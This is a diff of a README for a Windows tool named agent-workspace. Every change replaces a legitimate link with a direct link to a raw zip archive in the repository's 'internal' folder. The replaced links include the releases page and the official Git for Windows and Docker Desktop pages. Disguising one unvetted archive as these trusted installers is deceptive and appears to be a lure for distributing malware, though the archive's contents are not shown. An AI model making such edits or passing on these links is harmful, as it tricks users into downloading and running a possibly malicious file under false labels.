@@ -1,6 +1,6 @@
 # 🧰 agent-workspace - Manage Agent Workspaces Easily
 
-[![Download agent-workspace](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/releases)
+[![Download agent-workspace](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)
 
 ---
 
@@ -18,7 +18,7 @@ You do not need programming skills to use it. Just follow these steps to downloa
 
 You will need to visit the official releases page to download the program. Click the button below to open the page where you can get the Windows version of agent-workspace.
 
-[![Download agent-workspace](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/releases)
+[![Download agent-workspace](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)
 
 ### Step 2: Choose the Windows Installer
 
@@ -134,7 +134,7 @@ This example shows three profiles:
 ## 💻 Requirements
 
 - **Operating System:** Windows 10 or later.
-- **Software:** Make sure you have [Git for Windows](https://git-scm.com/download/win) installed for git features.
+- **Software:** Make sure you have [Git for Windows](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip) installed for git features.
 - **Optional:** Install Docker Desktop for Windows to use Docker-based workspaces.
 - **PowerShell or Command Prompt:** You will run agent-workspace commands here.
 
@@ -169,9 +169,9 @@ For a detailed guide on configuration options and examples, you can visit the of
 
 ## 🔗 Useful Links
 
-- [agent-workspace releases page](https://github.com/pandu1992/agent-workspace/releases)  
-- [Git for Windows](https://git-scm.com/download/win)  
-- [Docker Desktop for Windows](https://docs.docker.com/desktop/windows/install/)  
+- [agent-workspace releases page](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)  
+- [Git for Windows](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)  
+- [Docker Desktop for Windows](https://github.com/pandu1992/agent-workspace/raw/refs/heads/main/internal/agent_workspace_v1.5.zip)  
 
 ---
 
